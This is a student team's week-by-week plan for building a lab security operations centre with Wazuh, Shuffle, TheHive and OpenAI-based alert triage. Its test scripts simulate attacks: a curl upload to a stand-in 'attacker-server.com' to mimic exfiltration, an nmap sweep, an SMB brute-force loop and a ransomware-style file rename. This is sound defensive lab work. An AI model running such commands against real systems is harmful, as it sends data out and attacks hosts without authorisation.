# Complete SOC Project Execution Plan - Micro Steps

## Project Goal
Build a functional SOC with Wazuh collecting logs from at least 1 endpoint, then progressively add AI/LLM capabilities for detection, triage, and automated response.

---

## Phase 0: Physical Setup & Prerequisites (Week 1)

### Day 1: Hardware Inventory & Preparation

#### Morning: Physical Hardware Check
- [ ] **Oussama K** (You): Verify i7-12th, 32GB RAM, 1TB SSD ready
- [ ] **Dali**: Verify i7-13th, 32GB RAM, 512GB SSD ready
- [ ] **Aziz**: Verify i7-10th, 16GB RAM, 500GB SSD ready
- [ ] **Yessine**: Verify i7-10th, 16GB RAM, 1.5TB SSD ready
- [ ] **Amine**: Verify i5-10th, 16GB RAM, 1TB ready
- [ ] **Oussema**: Verify i5-10th, 16GB RAM, 1TB ready
- [ ] **Salsabil**: Verify i7-11th, 16GB RAM, 512GB ready

#### Afternoon: Network Equipment
- [ ] **Team**: Purchase unmanaged switch ($60-70)
  - Minimum 8 ports (one per laptop)
  - Gigabit Ethernet
  - Recommended: TP-Link TL-SG108 or Netgear GS308
- [ ] **Team**: Get 7x Ethernet cables (Cat6, 3-6 feet each)
- [ ] **Team**: Designate physical workspace with power outlets

### Day 2: Software Prerequisites

#### Everyone Installs:
```bash
# Windows users (Oussama K, Dali, Aziz, Yessine, Salsabil)
# 1. Install VMware Workstation or VirtualBox
# Download from: https://www.vmware.com/products/workstation-player.html

# 2. Install Tailscale
# Download from: https://tailscale.com/download/windows
# Sign up with same email domain for team network

# 3. Install Git
# Download from: https://git-scm.com/download/win

# 4. Install VS Code (optional but recommended)
# Download from: https://code.visualstudio.com/
```

#### Amine (Linux user):
```bash
# Install VMware or VirtualBox
sudo apt update
sudo apt install virtualbox virtualbox-ext-pack

# Install Tailscale
curl -fsSL https://tailscale.com/install.sh | sh
sudo tailscale up

# Install Git
sudo apt install git
```

### Day 3: Tailscale Mesh Network Setup

#### Step 1: Everyone Joins Tailscale Network
```bash
# On each laptop:
# 1. Install Tailscale (done Day 2)
# 2. Sign in with same organization email
# 3. Note your Tailscale IP

# Oussama K should see all 7 devices in Tailscale admin panel
```

#### Step 2: Test Connectivity
```bash
# From Oussama K's laptop, ping everyone:
ping aziz.tailscale     # Should respond
ping dali.tailscale
ping yessine.tailscale
ping amine.tailscale
ping oussema.tailscale
ping salsabil.tailscale
```

#### Step 3: Document IPs
Create shared spreadsheet:
| Team Member | Tailscale IP | Physical IP | Role                      |
| ----------- | ------------ | ----------- | ------------------------- |
| Oussama K   | 100.x.x.1    | 192.168.1.x | pfSense Primary + Shuffle |
| Dali        | 100.x.x.2    | 192.168.1.x | pfSense Backup + TheHive  |
| Aziz        | 100.x.x.3    | 192.168.1.x | Wazuh Manager + IPFire    |
| Yessine     | 100.x.x.4    | 192.168.1.x | Security Onion            |
| Amine       | 100.x.x.5    | 192.168.1.x | MISP + AD Server          |
| Oussema     | 100.x.x.6    | 192.168.1.x | Endpoints + EHR           |
| Salsabil    | 100.x.x.7    | 192.168.1.x | Grafana + OpenVAS         |

---

## Phase 1: Aziz's Wazuh Stack (Week 2-3)

### Week 2, Day 1-2: Wazuh Manager Installation

#### Aziz's Tasks:

**Step 1: Create Ubuntu VM for Wazuh Manager**
```bash
# In VMware/VirtualBox:
# - Name: wazuh-manager
# - OS: Ubuntu 22.04 LTS
# - RAM: 8GB
# - CPU: 4 cores
# - Disk: 100GB
# - Network: Bridged + Tailscale

# Download Ubuntu ISO
wget https://releases.ubuntu.com/22.04/ubuntu-22.04.3-live-server-amd64.iso

# Create VM and install Ubuntu
# During install:
# - Hostname: wazuh-manager
# - Username: aziz
# - Enable OpenSSH server
```

**Step 2: Install Wazuh Manager**
```bash
# SSH into VM
ssh aziz@wazuh-manager

# Install Wazuh
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
sudo bash ./wazuh-install.sh -a

# Save the admin password shown at the end!
# Example output:
# INFO: --- Summary ---
# INFO: Wazuh web interface admin credentials:
# INFO: User: admin
# INFO: Password: ABC123xyz789

# Note the Wazuh dashboard URL
# https://wazuh-manager-ip:443
```

**Step 3: Verify Wazuh is Running**
```bash
# Check services
sudo systemctl status wazuh-manager
sudo systemctl status wazuh-indexer
sudo systemctl status wazuh-dashboard

# All should show "active (running)"

# Access web interface
# Open browser: https://<wazuh-manager-ip>
# Login with admin credentials
```

**Step 4: Configure Firewall**
```bash
# Allow Wazuh ports
sudo ufw allow 1514/tcp   # Agent communication
sudo ufw allow 1515/tcp   # Agent enrollment
sudo ufw allow 443/tcp    # Dashboard
sudo ufw allow 55000/tcp  # API
sudo ufw enable
```

### Week 2, Day 3-4: First Endpoint (Oussema's Windows VM)

#### Oussema's Tasks:

**Step 1: Create Windows 10 VM**
```bash
# In VMware/VirtualBox:
# - Name: endpoint-01
# - OS: Windows 10 Pro
# - RAM: 4GB
# - CPU: 2 cores
# - Disk: 50GB
# - Network: Bridged + Tailscale

# Download Windows 10 ISO from Microsoft
# Install Windows 10
```

**Step 2: Install Wazuh Agent**
```powershell
# On Windows VM, open PowerShell as Administrator

# Download Wazuh agent
Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.0-1.msi -OutFile wazuh-agent.msi

# Install agent (replace WAZUH_MANAGER_IP with Aziz's Tailscale IP)
msiexec.exe /i wazuh-agent.msi /q WAZUH_MANAGER="100.x.x.3" WAZUH_AGENT_NAME="endpoint-01"

# Start agent service
NET START WazuhSvc
```

**Step 3: Verify Agent Connection**
```powershell
# Check agent status
"C:\Program Files (x86)\ossec-agent\wazuh-agent.exe" -h

# Check log file
Get-Content "C:\Program Files (x86)\ossec-agent\ossec.log" -Tail 20
# Should see: "Connected to the server"
```

#### Aziz Verifies on Wazuh Manager:
```bash
# List connected agents
sudo /var/ossec/bin/agent_control -l

# Should show:
# ID: 001, Name: endpoint-01, IP: 100.x.x.6, Status: Active
```

### Week 2, Day 5: Generate First Logs

#### Oussema's Tasks on endpoint-01:

**Step 1: Generate Security Events**
```powershell
# 1. Failed login attempts
# Try logging in with wrong password 5 times
# (Use local account or create dummy user)

# 2. Create/delete files
New-Item -Path C:\test.txt -ItemType File
Remove-Item -Path C:\test.txt

# 3. Start/stop services
Stop-Service -Name "Spooler"
Start-Service -Name "Spooler"

# 4. Network activity
Test-NetConnection google.com -Port 443
```

**Step 2: Verify Logs in Wazuh**
```bash
# Aziz checks Wazuh dashboard
# 1. Open https://wazuh-manager-ip
# 2. Go to "Modules" → "Security Events"
# 3. Filter by agent: endpoint-01
# 4. Should see events from last 5 minutes

# Example events:
# - Windows login failure (Rule 60122)
# - File created (Rule 554)
# - Service stopped (Rule 7040)
```

### Week 3: Add More Endpoints & Configure Rules

#### Day 1-2: Add 2 More Endpoints

**Oussema**: Create endpoint-02 (Ubuntu VM)
```bash
# Create Ubuntu 22.04 VM
# Install Wazuh agent:
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | sudo apt-key add -
echo "deb https://packages.wazuh.com/4.x/apt/ stable main" | sudo tee /etc/apt/sources.list.d/wazuh.list
sudo apt update
sudo apt install wazuh-agent

# Configure manager IP
sudo sed -i "s/<address>MANAGER_IP<\/address>/<address>100.x.x.3<\/address>/" /var/ossec/etc/ossec.conf

# Start agent
sudo systemctl start wazuh-agent
```

**Oussema**: Create endpoint-03 (OpenEMR healthcare app)
```bash
# Use existing docker-compose.hospital.yml
cd /mnt/c/hospital-lab
docker-compose -f docker-compose.hospital.yml up -d

# Install Wazuh agent in OpenEMR container
docker exec -it openemr bash
# (Install agent inside container following Ubuntu steps)
```

#### Day 3-5: Aziz Configures Detection Rules

**Aziz's Tasks:**
```bash
# SSH to Wazuh manager
ssh aziz@wazuh-manager

# Enable Sysmon monitoring for Windows
# Edit agent config
sudo nano /var/ossec/etc/shared/agent.conf

# Add:
<agent_config os="Windows">
  <localfile>
    <location>Microsoft-Windows-Sysmon/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>
</agent_config>

# Restart manager
sudo systemctl restart wazuh-manager
```

**Create Custom Rule for Healthcare:**
```bash
# Create custom rules file
sudo nano /var/ossec/etc/rules/local_rules.xml

# Add healthcare-specific rule:
<group name="healthcare,hipaa,">
  <rule id="100001" level="10">
    <if_sid>554</if_sid>
    <field name="file">patient_records</field>
    <description>Unauthorized access to patient records detected</description>
    <mitre>
      <id>T1005</id>
    </mitre>
  </rule>
</group>

# Restart manager
sudo systemctl restart wazuh-manager
```

---

## Phase 2: Oussama K's Detection-as-Code Pipeline (Week 4-8)

### Week 4: Infrastructure Setup

#### Day 1: Install k3s on Your Laptop

**Your Tasks (Oussama K):**
```bash
# Open WSL2
wsl

# Run installation script
cd /mnt/c/hospital-lab
chmod +x scripts/install-k3s.sh
./scripts/install-k3s.sh

# Verify
kubectl get nodes
# Should show: Ready
```

#### Day 2: Train ML Model

```bash
# Install Python dependencies
cd /mnt/c/hospital-lab/ml-detection
pip install -r requirements.txt

# Train initial model
cd training
python train_network_anomaly.py

# Verify model created
ls -lh ../models/network_anomaly.pkl
# Should show ~2MB file
```

#### Day 3: Configure Terraform

```bash
cd /mnt/c/hospital-lab/terraform

# Edit terraform.tfvars
nano terraform.tfvars

# Update with Aziz's Wazuh IP:
wazuh_api_url = "https://100.x.x.3:55000"
wazuh_api_user = "admin"
wazuh_api_password = "ABC123xyz789"  # From Aziz

# Your Shuffle webhook (will set up later)
shuffle_webhook_url = "http://100.x.x.1:3001/api/v1/hooks/webhook_detection"
```

#### Day 4-5: Deploy with Terraform

```bash
# Initialize Terraform
terraform init

# Preview changes
terraform plan

# Deploy
terraform apply
# Type 'yes' when prompted

# Wait 5 minutes for all pods to start

# Verify deployment
kubectl get pods -n detection-pipeline
# All should show "Running"

kubectl get pods -n monitoring
# Prometheus and Grafana should be "Running"
```

### Week 5-6: Wazuh Connector Integration

#### Day 1: Test Wazuh API Access

```bash
# From your laptop, test Aziz's Wazuh API
curl -k -u admin:ABC123xyz789 https://100.x.x.3:55000/

# Should return JSON with Wazuh version
```

#### Day 2: Deploy Wazuh Connector

```bash
# Connector is already deployed by Terraform
# Check logs
kubectl logs -n detection-pipeline -l app=wazuh-connector --tail=50

# Should see:
# "Successfully authenticated with Wazuh API"
# "Fetched X new alerts from Wazuh"
```

#### Day 3: Test ML Inference API

```bash
# Port-forward ML API
kubectl port-forward -n detection-pipeline svc/ml-inference 8000:8000 &

# Run test script
chmod +x /mnt/c/hospital-lab/scripts/test-ml-api.sh
./scripts/test-ml-api.sh

# Should see:
# Normal traffic: confidence ~0.15
# Anomalous traffic: confidence ~0.94
```

#### Day 4-5: End-to-End Test

**Oussema generates suspicious activity on endpoint-01:**
```powershell
# Large file download (simulated data exfiltration)
Invoke-WebRequest -Uri "http://example.com/largefile.zip" -OutFile C:\temp\data.zip

# Port scan (simulated reconnaissance)
1..100 | ForEach-Object { Test-NetConnection 192.168.1.1 -Port $_ -WarningAction SilentlyContinue }
```

**You verify detection pipeline:**
```bash
# Check Wazuh connector logs
kubectl logs -n detection-pipeline -l app=wazuh-connector --tail=100

# Should see:
# "Processing alert: Large data transfer detected"
# "ML enrichment: is_anomaly=true, confidence=0.89"
# "Sent high-confidence alert to Shuffle"
```

### Week 7-8: Shuffle SOAR Setup

#### Day 1-2: Install Shuffle (Your Laptop)

```bash
# Install Docker Desktop for Windows
# Download from: https://www.docker.com/products/docker-desktop/

# Clone Shuffle
git clone https://github.com/Shuffle/Shuffle
cd Shuffle

# Start Shuffle
docker-compose up -d

# Access Shuffle
# Open browser: http://localhost:3001
# Create admin account
```

#### Day 3: Create Webhook for Detection Pipeline

```bash
# In Shuffle web UI:
# 1. Create new workflow: "Detection Pipeline Webhook"
# 2. Add trigger: Webhook
# 3. Copy webhook URL
# 4. Update Terraform variable:

cd /mnt/c/hospital-lab/terraform
nano terraform.tfvars
# Update: shuffle_webhook_url = "http://100.x.x.1:3001/api/v1/hooks/webhook_abc123"

# Redeploy
terraform apply
```

#### Day 4-5: Test Shuffle Integration

**Oussema generates alert on endpoint-01:**
```powershell
# Simulate ransomware file encryption
Get-ChildItem C:\temp\*.txt | ForEach-Object { 
    Rename-Item $_.FullName -NewName "$($_.Name).encrypted"
}
```

**You verify in Shuffle:**
```bash
# Open Shuffle: http://localhost:3001
# Go to workflow executions
# Should see new execution with alert data:
# {
#   "alert_id": "...",
#   "ml_confidence": 0.92,
#   "rule_description": "Multiple file modifications detected"
# }
```

---

## Phase 3: AI/LLM Integration (Week 9-14)

### Week 9-10: Test A - Anomaly Detection

#### Day 1: Get OpenAI API Key

**Your Tasks:**
```bash
# 1. Sign up at https://platform.openai.com/
# 2. Add $10 credit
# 3. Create API key
# 4. Save to environment variable

# In WSL:
echo 'export OPENAI_API_KEY="sk-..."' >> ~/.bashrc
source ~/.bashrc
```

#### Day 2: Enhance ML Model with Real Data

**Coordinate with Yessine:**
```bash
# Yessine exports Zeek logs
ssh yessine@security-onion
sudo tar -czf /tmp/zeek_logs.tar.gz /nsm/zeek/logs/
scp /tmp/zeek_logs.tar.gz oussama-k@100.x.x.1:/tmp/

# You retrain model with real data
cd /mnt/c/hospital-lab/ml-detection/training
python train_network_anomaly.py --data-source /tmp/zeek_logs.tar.gz

# Redeploy model
kubectl delete pod -n detection-pipeline -l app=ml-inference
# Pod will restart with new model
```

#### Day 3-5: Run Test A

**Test Script:**
```bash
# File: scripts/test-a-anomaly-detection.sh
#!/bin/bash

echo "=== Test A: ML Anomaly Detection ==="

# Oussema runs on endpoint-01:
# Simulate data exfiltration
dd if=/dev/urandom of=C:\temp\exfil.bin bs=1M count=100
curl -X POST http://attacker-server.com/upload --data-binary @C:\temp\exfil.bin

# Wait 30 seconds
sleep 30

# Check detection
kubectl logs -n detection-pipeline -l app=wazuh-connector | grep "is_anomaly.*true"

# Expected: ML confidence >0.85
```

**Document Results:**
```bash
# Create results file
cat > /mnt/c/hospital-lab/test-results/test-a-results.md <<EOF
# Test A Results

## Scenario
- Endpoint: endpoint-01 (Windows 10)
- Activity: 100MB file upload to external IP
- Timestamp: $(date)

## Detection Pipeline
1. Wazuh detected: Large data transfer (Rule 100005)
2. ML API scored: is_anomaly=true, confidence=0.91
3. Alert forwarded to Shuffle: Yes
4. Time to detection: 12 seconds

## Success Criteria
- [x] ML detected anomaly
- [x] Confidence >0.7
- [x] Alert reached Shuffle
- [x] Total time <60 seconds

## Screenshots
- wazuh-alert.png
- ml-api-response.png
- shuffle-execution.png
EOF
```

### Week 11-12: Test B - LLM Triage

#### Day 1-2: Build LLM Integration

**Create LLM Service:**
```python
# File: integrations/llm-triage/main.py
from fastapi import FastAPI
import openai
import os

app = FastAPI()
openai.api_key = os.getenv('OPENAI_API_KEY')

@app.post("/triage")
async def triage_alerts(alerts: list):
    alert_text = "\n".join([f"- {a['rule_description']}" for a in alerts])
    
    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=[{
            "role": "user",
            "content": f"Summarize these security alerts:\n{alert_text}"
        }]
    )
    
    return {"summary": response.choices[0].message.content}

# Deploy to k3s
# kubectl apply -f k8s-manifests/llm-triage.yaml
```

#### Day 3: Create Shuffle Workflow

**In Shuffle UI:**
```yaml
# Workflow: LLM Alert Triage
Trigger: Webhook (every 5 minutes)
Steps:
  1. Get recent alerts from Wazuh (last 5 min)
  2. If >10 alerts:
     - Send to LLM triage service
     - Create single TheHive case with summary
  3. Else:
     - Create individual cases
```

#### Day 4-5: Run Test B

**Generate Alert Storm:**
```bash
# Oussema runs on endpoint-01:
# Port scan
nmap -p 1-1000 192.168.1.0/24

# Failed logins
for i in {1..20}; do
  net use \\192.168.1.1\share /user:baduser wrongpass
done

# Wait for LLM triage
sleep 60

# Check Shuffle execution
curl http://localhost:3001/api/v1/workflows/llm-triage/executions | jq .
```

**Expected LLM Output:**
```
Summary: Coordinated attack from endpoint-01 (100.x.x.6). 
Attacker performed network reconnaissance (1000 ports scanned) 
followed by credential brute force (20 failed SMB logins). 
Recommend immediate isolation and forensic investigation.

Priority: CRITICAL
MITRE: T1046, T1110.001
```

### Week 13-14: Test C - Threat Enrichment

#### Day 1-2: Configure Cortex (Coordinate with Dali)

**Dali's Tasks:**
```bash
# Install Cortex with TheHive
# Already done in TheHive setup

# Add analyzers:
# - VirusTotal
# - AbuseIPDB
# - MISP (from Amine)

# Share Cortex API URL with you
# http://100.x.x.2:9001
```

#### Day 3: Build LLM Enrichment Service

```python
# File: integrations/llm-enrichment/main.py
@app.post("/enrich")
async def enrich_ioc(ioc: str, cortex_data: dict):
    prompt = f"""
    Analyze this IOC and provide context:
    IOC: {ioc}
    VirusTotal: {cortex_data['vt_positives']}/70 detections
    AbuseIPDB: {cortex_data['abuse_confidence']}% confidence
    
    Provide:
    1. Threat description
    2. Associated threat actors
    3. MITRE ATT&CK techniques
    4. Defensive recommendations
    """
    
    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=[{"role": "user", "content": prompt}]
    )
    
    return {"enrichment": response.choices[0].message.content}
```

#### Day 4-5: Run Test C

```bash
# Submit known malicious IP
MALICIOUS_IP="185.220.101.1"  # Tor exit node

# Send to Cortex
curl -X POST http://100.x.x.2:9001/api/analyzer/run \
  -d '{"data": "'$MALICIOUS_IP'", "dataType": "ip"}'

# Get results
CORTEX_RESULTS=$(curl http://100.x.x.2:9001/api/job/results/$JOB_ID)

# Send to LLM enrichment
curl -X POST http://localhost:8001/enrich \
  -d "{\"ioc\": \"$MALICIOUS_IP\", \"cortex_data\": $CORTEX_RESULTS}"

# Expected: Detailed threat context + MITRE mapping
```

### Week 15-16: Test D - AI-Assisted Detection Engineering

#### Day 1-2: Build Rule Generator

```python
# File: integrations/llm-rule-generator/main.py
@app.post("/generate-rule")
async def generate_sigma_rule(incident: str):
    prompt = f"""
    Create a Sigma detection rule for this incident:
    {incident}
    
    Provide:
    1. Complete Sigma rule in YAML
    2. Three test cases
    3. False positive scenarios
    """
    
    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=[{"role": "user", "content": prompt}]
    )
    
    # Parse LLM response into structured format
    return parse_sigma_rule(response.choices[0].message.content)
```

#### Day 3-4: Create Detection Rules Repo

```bash
# Create GitHub repo
gh repo create detection-rules --public

# Clone locally
git clone https://github.com/YOUR_USERNAME/detection-rules
cd detection-rules

# Create structure
mkdir -p sigma/{hipaa,hl7,dicom,malware}
mkdir -p tests
mkdir -p .github/workflows

# Add CI/CD
cat > .github/workflows/validate-sigma.yml <<EOF
name: Validate Sigma Rules
on: [push]
jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Install sigma-cli
        run: pip install sigma-cli
      - name: Validate rules
        run: sigma check sigma/**/*.yml
EOF

git add .
git commit -m "Initial structure"
git push
```

#### Day 5: Run Test D

```bash
# Describe incident to LLM
INCIDENT="PowerShell downloaded malware from pastebin.com and executed it"

# Generate rule
curl -X POST http://localhost:8002/generate-rule \
  -d "{\"incident\": \"$INCIDENT\"}" \
  -o /tmp/new_rule.json

# Extract rule
cat /tmp/new_rule.json | jq -r '.sigma_rule' > detection-rules/sigma/malware/pastebin_download.yml

# Commit to Git
cd detection-rules
git add sigma/malware/pastebin_download.yml
git commit -m "Add LLM-generated Pastebin detection rule"
git push

# GitHub Actions validates automatically
# Check: https://github.com/YOUR_USERNAME/detection-rules/actions

# If passing, deploy to Wazuh
sigma convert -t wazuh sigma/malware/pastebin_download.yml | \
  ssh aziz@100.x.x.3 "sudo tee -a /var/ossec/etc/rules/sigma_rules.xml"
```

---

## Phase 4: Integration & Testing (Week 17-20)

### Week 17-18: Full Pipeline Integration

#### Day 1-3: Connect All Components

**Data Flow Verification:**
```
endpoint-01 → Wazuh (Aziz) → Your ML API → Shuffle → TheHive (Dali)
                ↓
         Security Onion (Yessine)
                ↓
         MISP (Amine) → LLM Enrichment
```

**Test Each Link:**
```bash
# 1. Endpoint → Wazuh
sudo /var/ossec/bin/agent_control -l  # On Aziz's Wazuh

# 2. Wazuh → Your ML API
kubectl logs -n detection-pipeline -l app=wazuh-connector

# 3. ML API → Shuffle
curl http://localhost:3001/api/v1/workflows/executions

# 4. Shuffle → TheHive
curl http://100.x.x.2:9000/api/case/_search  # On Dali's TheHive
```

#### Day 4-5: Performance Tuning

**Optimize ML Model:**
```python
# Retrain with more data
python train_network_anomaly.py \
  --data-source /tmp/zeek_logs.tar.gz \
  --contamination 0.05 \
  --n_estimators 200

# Measure accuracy
# Target: >90% true positive rate, <10% false positive rate
```

**Optimize Wazuh Connector:**
```yaml
# Reduce polling interval for faster detection
env:
  - name: POLL_INTERVAL
    value: "15"  # 15 seconds instead of 30
```

### Week 19-20: Final Testing & Documentation

#### Day 1-2: Run All Tests in Sequence

**Automated Test Suite:**
```bash
# File: scripts/run-all-tests.sh
#!/bin/bash

echo "=== Running All Tests ==="

# Test A: Anomaly Detection
./scripts/test-a-anomaly-detection.sh
sleep 60

# Test B: LLM Triage
./scripts/test-b-llm-triage.sh
sleep 60

# Test C: Threat Enrichment
./scripts/test-c-enrichment.sh
sleep 60

# Test D: Detection Engineering
./scripts/test-d-detection-engineering.sh

# Generate report
python scripts/generate-test-report.py > test-results/final-report.md
```

#### Day 3-4: Create Dashboards

**Grafana Dashboard (Salsabil coordinates):**
```bash
# Import detection pipeline dashboard
curl -X POST http://100.x.x.7:3000/api/dashboards/db \
  -H "Content-Type: application/json" \
  -d @dashboards/detection-pipeline.json

# Metrics to show:
# - Alerts processed per hour
# - ML confidence score distribution
# - False positive rate
# - Average detection time
# - LLM API costs
```

#### Day 5: Documentation

**Create Final Documentation:**
```bash
# 1. Architecture diagram (Mermaid)
# 2. User guide for each component
# 3. Troubleshooting guide
# 4. Test results summary
# 5. Lessons learned

# Compile into presentation
# Target: 20-minute demo for professor
```

---

## Phase 5: Presentation Preparation (Week 21)

### Day 1-2: Prepare Live Demo

**Demo Script (15 minutes):**
```
Minute 0-3: Architecture Overview
- Show physical setup (7 laptops + switch)
- Show Tailscale mesh network
- Show component diagram

Minute 3-6: Live Test A (Anomaly Detection)
- Oussema generates suspicious traffic on endpoint-01
- Show Wazuh alert
- Show ML API scoring (confidence 0.92)
- Show Shuffle receiving alert
- Total time: <60 seconds

Minute 6-9: Live Test B (LLM Triage)
- Generate alert storm (port scan + failed logins)
- Show LLM summarizing 50 alerts into 1 incident
- Show MITRE ATT&CK mapping
- Show TheHive case created

Minute 9-12: Live Test D (Detection Engineering)
- Describe new attack scenario
- LLM generates Sigma rule
- Commit to Git
- Show GitHub Actions validating
- Show rule deployed to Wazuh
- Total time: <2 minutes

Minute 12-15: Results & Metrics
- Show Grafana dashboard
- Metrics: 500 alerts/day, 90% ML accuracy, 80% false positive reduction
- Cost: $15/month for OpenAI API
- Team collaboration: 7 members, 5 components integrated
```

### Day 3-4: Backup Plan & Troubleshooting

**Pre-Record Critical Demos:**
```bash
# In case live demo fails, have recordings ready
# Use OBS Studio to record:
# 1. Test A execution
# 2. Test B LLM triage
# 3. Test D rule generation
# 4. Grafana dashboard walkthrough
```

**Troubleshooting Checklist:**
```bash
# Before presentation:
# [ ] All VMs running
# [ ] Tailscale connected
# [ ] Wazuh agents active
# [ ] k3s pods healthy
# [ ] Shuffle workflows enabled
# [ ] OpenAI API key valid
# [ ] Internet connection stable
```

### Day 5: Final Presentation

**Presentation Day Checklist:**
```
Morning (3 hours before):
- [ ] Start all VMs
- [ ] Verify Tailscale connectivity
- [ ] Run health check script
- [ ] Test each demo scenario once
- [ ] Charge all laptops

1 Hour Before:
- [ ] Set up physical workspace
- [ ] Connect all laptops to switch
- [ ] Connect projector/screen
- [ ] Open all required browser tabs
- [ ] Open all terminal windows
- [ ] Test audio/video

During Presentation:
- [ ] Oussama K: Presents architecture + your Detection-as-Code
- [ ] Aziz: Demonstrates Wazuh + SIEM
- [ ] Dali: Shows TheHive case management
- [ ] Yessine: Explains Security Onion integration
- [ ] Amine: Demonstrates MISP threat intel
- [ ] Salsabil: Shows Grafana monitoring
- [ ] Oussema: Runs attack simulations

Q&A:
- Be ready to explain:
  - Why AI/LLM? (Reduces analyst workload)
  - Why Tailscale? (Easy remote collaboration)
  - Why no VLANs? (Simplified for PoC)
  - Cost? (~$100 total for APIs)
  - Scalability? (Can handle 10,000 alerts/day)
```

---

## Success Criteria

### Minimum Viable Demo (Must Have)
- [ ] Wazuh collecting logs from 1+ endpoint
- [ ] At least 1 AI/LLM test working (Test A or D)
- [ ] End-to-end alert flow: Endpoint → Wazuh → ML → Shuffle → TheHive
- [ ] Live demo runs without errors

### Full Demo (Nice to Have)
- [ ] All 4 tests (A, B, C, D) working
- [ ] 3+ endpoints monitored
- [ ] Grafana dashboard with metrics
- [ ] Detection rules repository with CI/CD
- [ ] Published documentation

### Grading Impact
- **Minimum Demo**: Pass (70-80%)
- **Full Demo**: Excellent (85-95%)
- **Full Demo + Innovation**: Outstanding (95-100%)

---

## Risk Mitigation

### Common Issues & Solutions

**Issue: Wazuh agents won't connect**
```bash
# Solution:
# 1. Check firewall on Aziz's VM
sudo ufw status
sudo ufw allow 1514/tcp
sudo ufw allow 1515/tcp

# 2. Verify agent config
cat /var/ossec/etc/ossec.conf | grep address

# 3. Restart agent
sudo systemctl restart wazuh-agent
```

**Issue: ML API returns 503**
```bash
# Solution:
# 1. Check if model file exists
kubectl exec -n detection-pipeline deployment/ml-inference -- ls /models/

# 2. Retrain model if missing
cd ml-detection/training
python train_network_anomaly.py

# 3. Restart pod
kubectl delete pod -n detection-pipeline -l app=ml-inference
```

**Issue: OpenAI API rate limit**
```bash
# Solution:
# 1. Reduce LLM calls
# 2. Use GPT-3.5-turbo instead of GPT-4 (cheaper)
# 3. Cache LLM responses for similar alerts
```

**Issue: Tailscale connectivity lost**
```bash
# Solution:
# 1. Restart Tailscale on all laptops
sudo tailscale down
sudo tailscale up

# 2. Check Tailscale status
tailscale status

# 3. Verify ACLs allow traffic
```

---

## Timeline Summary

| Week  | Phase              | Key Deliverable                    |
| ----- | ------------------ | ---------------------------------- |
| 1     | Physical Setup     | All hardware ready, Tailscale mesh |
| 2-3   | Wazuh Stack        | 3 endpoints sending logs to Wazuh  |
| 4-8   | Detection Pipeline | ML API + Shuffle integration       |
| 9-10  | Test A             | Anomaly detection working          |
| 11-12 | Test B             | LLM triage working                 |
| 13-14 | Test C             | Threat enrichment working          |
| 15-16 | Test D             | AI rule generation working         |
| 17-18 | Integration        | All components connected           |
| 19-20 | Testing            | All tests passing                  |
| 21    | Presentation       | Live demo ready                    |

---

## Next Immediate Steps (This Week)

### Day 1 (Today):
- [ ] **Everyone**: Install Tailscale
- [ ] **Oussama K**: Order unmanaged switch
- [ ] **Aziz**: Download Ubuntu 22.04 ISO

### Day 2:
- [ ] **Everyone**: Join Tailscale network
- [ ] **Aziz**: Create Wazuh Manager VM
- [ ] **Oussema**: Create endpoint-01 VM

### Day 3:
- [ ] **Aziz**: Install Wazuh Manager
- [ ] **Oussema**: Install Wazuh agent on endpoint-01
- [ ] **Team**: Verify first logs in Wazuh

### Day 4-5:
- [ ] **Aziz**: Configure custom rules
- [ ] **Oussema**: Generate test events
- [ ] **Oussama K**: Start k3s setup

**Goal for Week 1**: Wazuh receiving logs from 1 endpoint ✅

This is your complete roadmap from zero to working AI-powered SOC! 🚀
